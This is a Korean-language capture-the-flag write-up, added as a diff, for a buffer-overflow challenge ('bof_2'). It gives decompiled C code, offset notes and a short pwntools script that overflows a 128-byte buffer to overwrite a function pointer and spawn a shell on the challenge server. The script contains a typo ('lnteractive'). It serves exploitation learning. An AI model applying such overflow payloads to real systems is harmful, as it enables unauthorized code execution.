@@ -1,0 +1,133 @@
+8C - C = 70
+
+8C  = 140
+
+C = 12
+
+== 10진수 128
+
+따로 시스템 권한이 있는것이 아니므로??
+
+페이로드
+
+버퍼 + 쉘코드(유저) + ret주소???
+
+
+
+소스코드
+
+
+int __cdecl main()
+{
+  int v1; // [sp+4h] [bp-94h]@0
+  int v2; // [sp+8h] [bp-90h]@0
+  char s; // [sp+Ch] [bp-8Ch]@1
+  int v4; // [sp+10h] [bp-88h]@1
+  int v5; // [sp+14h] [bp-84h]@1
+  int v6; // [sp+18h] [bp-80h]@1
+  int v7; // [sp+1Ch] [bp-7Ch]@1
+  int v8; // [sp+20h] [bp-78h]@1
+  int v9; // [sp+24h] [bp-74h]@1
+  int v10; // [sp+28h] [bp-70h]@1
+  int v11; // [sp+2Ch] [bp-6Ch]@1
+  int v12; // [sp+30h] [bp-68h]@1
+  int v13; // [sp+34h] [bp-64h]@1
+  int v14; // [sp+38h] [bp-60h]@1
+  int v15; // [sp+3Ch] [bp-5Ch]@1
+  int v16; // [sp+40h] [bp-58h]@1
+  int v17; // [sp+44h] [bp-54h]@1
+  int v18; // [sp+48h] [bp-50h]@1
+  int v19; // [sp+4Ch] [bp-4Ch]@1
+  int v20; // [sp+50h] [bp-48h]@1
+  int v21; // [sp+54h] [bp-44h]@1
+  int v22; // [sp+58h] [bp-40h]@1
+  int v23; // [sp+5Ch] [bp-3Ch]@1
+  int v24; // [sp+60h] [bp-38h]@1
+  int v25; // [sp+64h] [bp-34h]@1
+  int v26; // [sp+68h] [bp-30h]@1
+  int v27; // [sp+6Ch] [bp-2Ch]@1
+  int v28; // [sp+70h] [bp-28h]@1
+  int v29; // [sp+74h] [bp-24h]@1
+  int v30; // [sp+78h] [bp-20h]@1
+  int v31; // [sp+7Ch] [bp-1Ch]@1
+  int v32; // [sp+80h] [bp-18h]@1
+  int v33; // [sp+84h] [bp-14h]@1
+  int v34; // [sp+88h] [bp-10h]@1
+  int (*v35)(); // [sp+8Ch] [bp-Ch]@1
+  int v36; // [sp+90h] [bp-8h]@1
+  int v37; // [sp+94h] [bp-4h]@1
+  __int64 v38; // [sp+98h] [bp+0h]@1
+
+  v35 = sup;
+  fgets(&s, 133, stdin);
+  ((void (__stdcall *)(int, int, _DWORD, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int (*)(), int, int, _DWORD, _DWORD))v35)(
+    v1,
+    v2,
+    *(_DWORD *)&s,
+    v4,
+    v5,
+    v6,
+    v7,
+    v8,
+    v9,
+    v10,
+    v11,
+    v12,
+    v13,
+    v14,
+    v15,
+    v16,
+    v17,
+    v18,
+    v19,
+    v20,
+    v21,
+    v22,
+    v23,
+    v24,
+    v25,
+    v26,
+    v27,
+    v28,
+    v29,
+    v30,
+    v31,
+    v32,
+    v33,
+    v34,
+    v35,
+    v36,
+    v37,
+    v38,
+    HIDWORD(v38));
+  return 0;
+}
+
+이소스코드만 보면 버퍼는 133 이고 ret주소를 제외하면 128이다.
+
+즉 
+
+페이로드는 "A" * 128 + ret주소 인데
+
+소스코드를 보면 ((void (__stdcall *) 코드가 포인터 되어있다. 즉 버퍼오버플로우를 이용해서 포인터 함수의 위치주소를 ret주소(쉘코드)로 바꿔주면된다. 
+		>> 이부분은 sup 부분이므로 간단한 코드인데 이부분을 바꿔주면된다.
+코드를 작성해보자
+
+bof_2.py
+
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz',3001)
+payload =  "A"*128
+payload += p32(0x804849b)
+
+p.sendline(payload)
+p.lnteractive()
+
+입력해주고
+
+python bof_2.py 를 해주면 성공적으로 쉘 접속이 된다.
+
+ls 입력하고 cat flag 를 입력하면 플래그를 성공적으로 획득할수있다.
+
+   
